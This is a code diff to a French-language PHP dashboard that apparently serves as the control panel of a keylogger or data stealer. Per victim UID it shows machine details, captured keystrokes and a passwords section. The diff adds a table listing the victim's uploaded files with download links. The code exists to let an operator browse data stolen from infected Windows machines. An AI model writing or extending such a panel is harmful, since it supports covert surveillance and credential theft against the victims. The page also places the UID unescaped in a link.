@@ -143,7 +143,7 @@ if (!$uid) {
               <table class="custom-table">
                 <thead>
                   <tr>
-                    <th>Nom de l'ordinateur</th>
+                    <th>Nom de l'ordinateurs</th>
                     <th>Utilisateur</th>
                     <th>Version Windows</th>
                     <th>Architecture</th>
@@ -183,7 +183,7 @@ if (!$uid) {
               <table class="custom-table">
                 <thead>
                   <tr>
-                    <th>Texte tapé</th>
+                    <th>Info tapée</th>
                   </tr>
                 </thead>
                 <tbody>
@@ -215,6 +215,37 @@ if (!$uid) {
             <div class="custom-card">
               <h5><i class="bx bx-folder custom-icon"></i> Fichiers</h5>
               <p>Aucune donnée disponible pour les fichiers.</p>
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Fichiers</th>
+                  </tr>
+                </thead>
+                <tbody>
+       
+
+                  <?php
+                  // Requête SQL pour récupérer les informations des frappes
+                  $sql = "SELECT filename, file_type FROM upload_files WHERE uid = ?" ;
+                  $stmt = $conn->prepare($sql);
+                  $stmt->bind_param("s", $uid);
+                  $stmt->execute();
+                  $result = $stmt->get_result();
+
+                  // Vérifier si des résultats sont retournés
+                  if ($result->num_rows > 0) {
+                    while ($row = $result->fetch_assoc()) {
+                      echo "<tr>";
+                      echo "<td><a href='". "../../" . $uid . "/". htmlspecialchars($row['filename'])  . "'>" . htmlspecialchars($row['filename']) . "</a></td>";
+                      echo "</tr>";
+                    }
+                  } else {
+                    echo "<tr><td colspan='2'>Aucune donnée disponible pour cet UID.</td></tr>";
+                  }
+                  $stmt->close();
+                  ?>
+                </tbody>
+              </table>
             </div>
 
             <!-- Bloc 4 : Mots de passe -->
